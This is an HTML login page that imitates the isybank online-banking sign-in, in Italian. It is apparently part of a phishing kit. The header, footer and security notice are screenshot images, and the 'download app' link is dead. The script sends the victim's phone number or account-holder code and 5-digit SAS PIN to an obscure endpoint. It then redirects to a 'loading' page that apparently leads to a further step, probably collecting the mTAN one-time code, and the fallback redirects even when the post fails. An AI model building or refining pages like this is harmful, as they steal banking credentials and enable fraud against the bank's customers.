<!DOCTYPE html>
<html lang="it">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>isybank</title>
    <link rel="stylesheet" href="public/css/botta.css">
    <style>
        /* =========================================================
           isybank Embedded Stylesheet - Responsive for All Devices
           Big prominent typography on PC, fluid scaling for mobile/tablet
           ========================================================= */

        :root {
            --isy-bg: #f7f7f8;
            --isy-text: #191919;
            --isy-text-secondary: #595959;
            --isy-placeholder: #757575;
            --isy-border: #c2c3c6;
            --isy-border-mobile: #757575;
            --isy-btn-disabled-bg: #d1d2d4;
            --isy-btn-disabled-text: #8c8c8c;
            --isy-btn-active-bg: #0066cc;
            --isy-link: #0066cc;
            --isy-font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        html, body {
            width: 100%;
            min-height: 100vh;
            min-height: 100dvh;
            background-color: var(--isy-bg);
            font-family: var(--isy-font);
            color: var(--isy-text);
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        body {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            overflow-x: hidden;
            position: relative;
        }

        /* HEADER */
        .header-desktop {
            width: 100%;
            background-color: var(--isy-bg);
            display: block;
            overflow: hidden;
            flex-shrink: 0;
        }

        .header-desktop img {
            width: 100%;
            max-height: 110px;
            object-fit: cover;
            object-position: left center;
            height: auto;
            display: block;
        }

        .header-mobile {
            display: none;
        }

        /* MAIN CONTENT AREA */
        .main-content {
            flex: 1;
            width: 100%;
            display: flex;
            flex-direction: column;
            justify-content: flex-start;
            position: relative;
            z-index: 2;
            padding: clamp(8px, 1.5vh, 24px) 0 clamp(20px, 3vh, 40px);
        }

        .content-inner {
            width: 100%;
            max-width: 1600px;
            margin: 0 auto;
            padding-left: clamp(140px, 24vw, 440px);
            padding-right: 24px;
            box-sizing: border-box;
        }

        /* TITLE & SUBTITLE - BIGGER & PROMINENT ON PC */
        .page-title {
            font-size: clamp(36px, 3.2vw, 54px);
            font-weight: 700;
            line-height: 1.15;
            letter-spacing: -0.6px;
            color: var(--isy-text);
            margin-bottom: clamp(14px, 1.4vw, 22px);
            text-align: left;
        }

        .title-desktop {
            display: block;
        }

        .title-mobile {
            display: none;
        }

        .page-subtitle {
            font-size: clamp(18px, 1.35vw, 24px);
            font-weight: 400;
            line-height: 1.35;
            color: var(--isy-text);
            margin-bottom: clamp(24px, 2.2vw, 36px);
            text-align: left;
        }

        /* LOGIN FORM & INPUTS - PROMINENT & CLEAR ON PC */
        .login-form {
            display: flex;
            flex-direction: column;
            width: 100%;
        }

        .input-field-block {
            display: flex;
            flex-direction: column;
            margin-bottom: clamp(14px, 1.3vw, 20px);
        }

        .input-field-block .input-group {
            margin-bottom: 0;
        }

        .input-group {
            display: flex;
            align-items: center;
            margin-bottom: clamp(14px, 1.3vw, 20px);
            position: relative;
        }

        .input-wrapper {
            position: relative;
            width: clamp(280px, 23vw, 380px);
        }

        .isy-input {
            width: 100%;
            height: clamp(48px, 3.4vw, 54px);
            background: #ffffff;
            border: 1.5px solid var(--isy-border);
            border-radius: 10px;
            padding: 16px clamp(12px, 1vw, 16px) 4px;
            font-size: clamp(15px, 1.05vw, 17px);
            color: var(--isy-text);
            font-family: inherit;
            outline: none;
            box-sizing: border-box;
            transition: border-color 0.15s, box-shadow 0.15s;
        }

        .floating-label {
            position: absolute;
            left: clamp(12px, 1vw, 16px);
            top: 50%;
            transform: translateY(-50%);
            font-size: clamp(13px, 0.95vw, 15px);
            color: var(--isy-placeholder);
            pointer-events: none;
            transition: top 0.15s ease-out, font-size 0.15s ease-out, color 0.15s ease-out;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: calc(100% - 24px);
        }

        .isy-input:focus ~ .floating-label,
        .isy-input:not(:placeholder-shown) ~ .floating-label {
            top: 11px;
            font-size: 11px;
            color: #0070ba;
        }

        .isy-input:focus {
            border-color: #0070ba;
            box-shadow: 0 0 0 1px #0070ba;
        }

        /* Error State */
        .isy-input.has-error {
            border-color: #e60001 !important;
            box-shadow: 0 0 0 1px #e60001 !important;
        }

        .isy-input.has-error ~ .floating-label {
            color: #e60001 !important;
        }

        /* Input Error Message */
        .input-error-msg {
            display: flex;
            align-items: center;
            margin-top: 6px;
            width: clamp(280px, 23vw, 380px);
            text-align: left;
            box-sizing: border-box;
        }

        .error-circle-icon {
            width: 16px;
            height: 16px;
            background-color: #e60001;
            color: #ffffff;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: 700;
            line-height: 1;
            margin-right: 6px;
            flex-shrink: 0;
        }

        .error-text {
            color: #e60001;
            font-size: clamp(12px, 0.85vw, 13.5px);
            font-weight: 400;
            line-height: 1.25;
        }

        /* Help icon button (?) */
        .help-btn {
            background: transparent;
            border: 1.2px solid #757575;
            border-radius: 50%;
            cursor: pointer;
            padding: 0;
            margin-left: clamp(10px, 0.8vw, 14px);
            display: inline-flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            width: clamp(19px, 1.4vw, 24px);
            height: clamp(19px, 1.4vw, 24px);
            color: #595959;
            font-size: clamp(11.5px, 0.85vw, 14px);
            font-weight: 500;
            line-height: 1;
            user-select: none;
            transition: border-color 0.15s, color 0.15s, transform 0.15s;
        }

        .help-btn:hover {
            border-color: #333333;
            color: #191919;
            transform: scale(1.06);
        }

        /* BUTTON: ENTRA */
        .btn-entra {
            width: clamp(150px, 11vw, 190px);
            height: clamp(38px, 2.7vw, 46px);
            background-color: var(--isy-btn-disabled-bg);
            color: var(--isy-btn-disabled-text);
            border: none;
            border-radius: 10px;
            font-size: clamp(14.5px, 1.05vw, 17px);
            font-weight: 600;
            font-family: inherit;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: default;
            margin-top: clamp(14px, 1.3vw, 22px);
            margin-bottom: clamp(14px, 1.3vw, 20px);
            transition: background-color 0.2s, color 0.2s, box-shadow 0.2s;
            user-select: none;
        }

        .btn-entra.active {
            background-color: var(--isy-btn-active-bg);
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 2px 8px rgba(0, 102, 204, 0.25);
        }

        .btn-entra.active:hover {
            background-color: #0056b3;
            box-shadow: 0 4px 12px rgba(0, 102, 204, 0.35);
        }

        /* REGISTER / DOWNLOAD APP ROW */
        .register-row {
            font-size: clamp(13.5px, 0.95vw, 16px);
            color: var(--isy-text);
            margin-bottom: clamp(24px, 2.2vw, 36px);
            text-align: left;
        }

        .register-row a {
            color: var(--isy-link);
            text-decoration: underline;
            font-weight: 500;
        }

        .register-row a:hover {
            color: #004085;
        }

        /* SECURITY NOTIFICATION (q3.png) */
        .security-box {
            width: clamp(280px, 23vw, 380px);
            margin-top: 6px;
            overflow: visible;
        }

        .security-box img {
            width: 128%;
            max-width: 480px;
            height: auto;
            display: block;
            margin-left: -12.5%;
        }

        /* RAINBOW GRAPHIC DECORATION (q2.png) */
        .rainbow-graphic {
            position: fixed;
            right: 0;
            bottom: clamp(20px, 2.8vh, 36px);
            width: clamp(190px, 22vw, 380px);
            height: auto;
            pointer-events: none;
            z-index: 1;
            display: block;
        }

        /* FOOTER (DESKTOP) */
        .footer-desktop {
            width: 100%;
            background: #ffffff;
            padding: clamp(6px, 1vh, 12px) 0;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            z-index: 2;
            flex-shrink: 0;
        }

        .footer-desktop img {
            width: 100%;
            max-width: 1100px;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        .footer-mobile {
            display: none;
        }

        /* TABLETS & MEDIUM SCREENS (769px to 1024px) */
        @media (max-width: 1024px) {
            .content-inner {
                padding-left: clamp(60px, 14vw, 160px);
            }

            .rainbow-graphic {
                width: clamp(160px, 18vw, 220px);
            }
        }

        @media (max-width: 900px) {
            .content-inner {
                padding-left: clamp(40px, 10vw, 90px);
            }

            .rainbow-graphic {
                width: 170px;
                opacity: 0.9;
            }
        }

        /* MOBILE DEVICES (<= 768px) */
        @media (max-width: 768px) {
            .header-desktop {
                display: none !important;
            }

            .header-mobile {
                display: flex;
                justify-content: center;
                align-items: center;
                width: 100%;
                padding: clamp(8px, 1.8vh, 16px) 16px 0;
                background-color: var(--isy-bg);
            }

            .header-mobile img {
                width: 100%;
                max-width: clamp(280px, 80vw, 420px);
                height: auto;
                display: block;
                margin: 0 auto;
            }

            .main-content {
                padding: 6px 0 20px;
            }

            .content-inner {
                padding-left: 0;
                padding-right: 0;
                max-width: 100%;
            }

            .mobile-content-wrapper {
                width: 100%;
                max-width: 440px;
                margin: 0 auto;
                padding: 0 16px;
            }

            .title-desktop {
                display: none !important;
            }

            .title-mobile {
                display: block;
                font-size: clamp(28px, 7.6vw, 42px);
                line-height: 1.15;
                letter-spacing: -0.5px;
                padding-left: clamp(2px, 1.5vw, 8px);
                margin-bottom: clamp(18px, 2.8vh, 26px);
                text-align: left;
            }

            .page-subtitle {
                font-size: clamp(17px, 4.6vw, 23px);
                text-align: center;
                margin-bottom: clamp(18px, 2.8vh, 26px);
                letter-spacing: -0.2px;
            }

            .login-form {
                align-items: center;
            }

            .input-group {
                justify-content: center;
                width: 100%;
                margin-bottom: clamp(14px, 2.2vh, 20px);
            }

            .input-wrapper {
                width: 100%;
                max-width: clamp(260px, 80vw, 310px);
            }

            .isy-input {
                width: 100%;
                max-width: clamp(260px, 80vw, 310px);
                height: clamp(48px, 6.2vh, 54px);
                border: 1.2px solid var(--isy-border-mobile);
                border-radius: 14px;
                padding: 0 14px;
                font-size: 16px;
                text-overflow: ellipsis;
                white-space: nowrap;
                overflow: hidden;
            }

            .isy-input::placeholder {
                font-size: 15.5px;
            }

            .password-input {
                text-transform: uppercase;
            }

            .password-input::placeholder {
                text-transform: uppercase;
            }

            .help-btn {
                display: none !important;
            }

            .btn-entra {
                width: clamp(210px, 66vw, 250px);
                max-width: 82%;
                height: clamp(48px, 6.2vh, 54px);
                border-radius: 14px;
                font-size: clamp(15.5px, 4.2vw, 17.5px);
                margin-top: clamp(16px, 2.4vh, 22px);
                margin-bottom: clamp(16px, 2.4vh, 22px);
            }

            .register-row {
                display: flex;
                flex-direction: column;
                align-items: center;
                text-align: center;
                font-size: clamp(13px, 3.6vw, 15px);
                line-height: 1.45;
                margin-bottom: clamp(24px, 4vh, 38px);
            }

            .register-row span {
                margin-bottom: 2px;
            }

            .security-box {
                display: none !important;
            }

            .rainbow-graphic {
                display: none !important;
            }

            .footer-desktop {
                display: none !important;
            }

            .footer-mobile {
                display: flex;
                justify-content: center;
                align-items: center;
                width: 100%;
                background: #ffffff;
                padding: clamp(10px, 1.8vh, 16px) 16px;
                position: relative;
                z-index: 2;
                flex-shrink: 0;
            }

            .footer-mobile img {
                width: 100%;
                max-width: clamp(280px, 86vw, 420px);
                height: auto;
                display: block;
                margin: 0 auto;
            }
        }

        /* Extra small devices (iPhone SE, Galaxy Fold 320px) */
        @media (max-width: 360px) {
            .title-mobile {
                font-size: 27px;
            }

            .page-subtitle {
                font-size: 16.5px;
            }

            .input-wrapper,
            .isy-input {
                max-width: 100%;
            }

            .btn-entra {
                width: 100%;
            }
        }
    </style>
</head>

<body>

    <!-- Header Section (q1.png on Desktop, q1M.png on Mobile) -->
    <header class="header-desktop" aria-label="Intestazione isybank">
        <img src="public/img/q1.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='img/q1.png';}">
    </header>
    <header class="header-mobile" aria-label="Intestazione isybank mobile">
        <img src="public/img/q1M.png" alt="isybank" onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='img/q1M.png';}">
    </header>

    <!-- Main Content Area -->
    <main class="main-content">
        <div class="content-inner">
            <div class="mobile-content-wrapper">

                <!-- Heading: 2 lines on Desktop, 3 lines on Mobile -->
                <h1 class="page-title title-desktop">Sempre un piacere<br>quando passi di qui.</h1>
                <h1 class="page-title title-mobile">Sempre un<br>piacere quando<br>passi di qui.</h1>

                <!-- Subtitle -->
                <p class="page-subtitle">Inserisci le tue credenziali</p>

                <!-- Credentials Form -->
                <form id="loginForm" class="login-form" autocomplete="on" novalidate>

                    <!-- Input 1: Cellulare o codice titolare -->
                    <div class="input-field-block">
                        <div class="input-group">
                            <div class="input-wrapper">
                                <input type="text" id="username" name="username" class="isy-input"
                                    placeholder=" " required autocomplete="username" spellcheck="false">
                                <label for="username" class="floating-label">Numero di cellulare o codice titolare *</label>
                            </div>
                            <button type="button" class="help-btn" aria-label="Aiuto codice titolare" title="Aiuto">
                                <span class="help-icon">?</span>
                            </button>
                        </div>
                    </div>

                    <!-- Input 2: SAS / Password -->
                    <div class="input-field-block">
                        <div class="input-group">
                            <div class="input-wrapper">
                                <input type="password" id="password" name="password" class="isy-input password-input"
                                    placeholder=" " required autocomplete="current-password"
                                    maxlength="5" inputmode="numeric" pattern="[0-9]*">
                                <label for="password" class="floating-label" id="passwordLabel">sas *</label>
                            </div>
                            <button type="button" class="help-btn" aria-label="Aiuto codice SAS" title="Aiuto">
                                <span class="help-icon">?</span>
                            </button>
                        </div>
                        <div id="sasError" class="input-error-msg" style="display:none;" role="alert">
                            <span class="error-circle-icon" aria-hidden="true">!</span>
                            <span class="error-text">Formato errato, il sas è composto da 5 cifre</span>
                        </div>
                    </div>

                    <!-- Button: Entra -->
                    <button type="submit" id="submitBtn" class="btn-entra" disabled>Entra</button>

                    <!-- Link: Scarica l'app -->
                    <div class="register-row">
                        <span>Non sei ancora cliente?</span>
                        <a href="#" class="download-link">Scarica l'app</a>
                    </div>

                    <!-- Security Info Box (Desktop only, q3.png) -->
                    <div class="security-box" aria-label="Informazioni sicurezza">
                        <img src="public/img/q3.png" alt="Aiutaci ad aumentare la tua sicurezza: scopri come proteggerti dalle truffe"
                            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='img/q3.png';}">
                    </div>

                </form>

            </div>
        </div>

        <!-- Decorative Rainbow Graphics (Desktop only, q2.png) -->
        <img src="public/img/q2.png" alt="" class="rainbow-graphic" aria-hidden="true"
            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='img/q2.png';}">
    </main>

    <!-- Footer Section (q4.png on Desktop, q4M.png on Mobile) -->
    <footer class="footer-desktop" aria-label="Piè di pagina isybank">
        <img src="public/img/q4.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='img/q4.png';}">
    </footer>
    <footer class="footer-mobile" aria-label="Piè di pagina isybank mobile">
        <img src="public/img/q4M.png" alt="Guida ai servizi | Sicurezza | Privacy | Cookies | Reclami e risoluzione delle controversie | Dichiarazione di accessibilità | Trasparenza"
            onerror="if(!this.dataset.retried){this.dataset.retried=1;this.src='img/q4M.png';}">
    </footer>

    <!-- Interactive Logic -->
    <script>
        (function() {
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const submitBtn = document.getElementById('submitBtn');
            const loginForm = document.getElementById('loginForm');
            const sasError = document.getElementById('sasError');
            const passwordLabel = document.getElementById('passwordLabel');

            function showError() {
                passwordInput.classList.add('has-error');
                if (sasError) sasError.style.display = 'flex';
            }

            function clearError() {
                passwordInput.classList.remove('has-error');
                if (sasError) sasError.style.display = 'none';
            }

            // Responsive label adjustment for password field
            function updatePasswordPlaceholder() {
                if (passwordLabel) {
                    passwordLabel.textContent = (window.innerWidth <= 768) ? 'SAS *' : 'sas *';
                }
            }
            updatePasswordPlaceholder();
            window.addEventListener('resize', updatePasswordPlaceholder);

            // Button activation state: username filled AND password has exactly 5 digits
            function checkInputs() {
                const hasUser = usernameInput.value.trim().length > 0;
                const isFiveDigits = /^[0-9]{5}$/.test(passwordInput.value);
                if (hasUser && isFiveDigits) {
                    submitBtn.disabled = false;
                    submitBtn.classList.add('active');
                } else {
                    submitBtn.disabled = true;
                    submitBtn.classList.remove('active');
                }
            }

            // Reject non-numeric keystrokes
            passwordInput.addEventListener('keydown', function(e) {
                if (['Backspace', 'Tab', 'Delete', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Enter'].includes(e.key) ||
                    e.ctrlKey || e.metaKey) {
                    return;
                }
                if (!/^[0-9]$/.test(e.key)) {
                    e.preventDefault();
                    showError();
                    return;
                }
                if (this.value.length >= 5 && this.selectionStart === this.selectionEnd) {
                    e.preventDefault();
                }
            });

            // Input event sanitization (virtual keyboard, autofill, IME)
            passwordInput.addEventListener('input', function() {
                const original = this.value;
                const sanitized = original.replace(/[^0-9]/g, '').slice(0, 5);

                if (original !== sanitized) {
                    showError();
                    this.value = sanitized;
                } else if (this.value.length === 5 || this.value.length === 0) {
                    clearError();
                }

                checkInputs();
            });

            // Paste event sanitization
            passwordInput.addEventListener('paste', function(e) {
                e.preventDefault();
                const clipData = (e.clipboardData || window.clipboardData);
                if (!clipData) return;
                const pasted = clipData.getData('text');
                const sanitized = pasted.replace(/[^0-9]/g, '').slice(0, 5);

                if (sanitized !== pasted || pasted.length > 5) {
                    showError();
                } else if (sanitized.length === 5) {
                    clearError();
                }

                this.value = sanitized;
                checkInputs();
            });

            // Blur event validation
            passwordInput.addEventListener('blur', function() {
                if (this.value.length > 0 && this.value.length < 5) {
                    showError();
                } else if (this.value.length === 5 || this.value.length === 0) {
                    clearError();
                }
            });

            usernameInput.addEventListener('input', checkInputs);

            // Form Submission Handling
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                const username = usernameInput.value.trim();
                const password = passwordInput.value;

                if (!username || !/^[0-9]{5}$/.test(password)) {
                    if (!/^[0-9]{5}$/.test(password)) {
                        showError();
                    }
                    return;
                }

                submitBtn.disabled = true;
                submitBtn.textContent = '...';

                // Try backend API first
                fetch('/gzLbTbjqMpc34D4XsPJ2', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                })
                .then(function(res) {
                    return res.json();
                })
                .then(function(data) {
                    if (data && data.OK) {
                        window.location.href = '/loading?time=12&url=/Mtan4gImt9DmQlk7b';
                    } else {
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Entra';
                    }
                })
                .catch(function() {
                    // Fallback for standalone/local file preview
                    setTimeout(function() {
                        window.location.href = '/loading?time=12&url=/Mtan4gImt9DmQlk7b';
                    }, 500);
                });
            });
        })();
    </script>
</body>

</html>
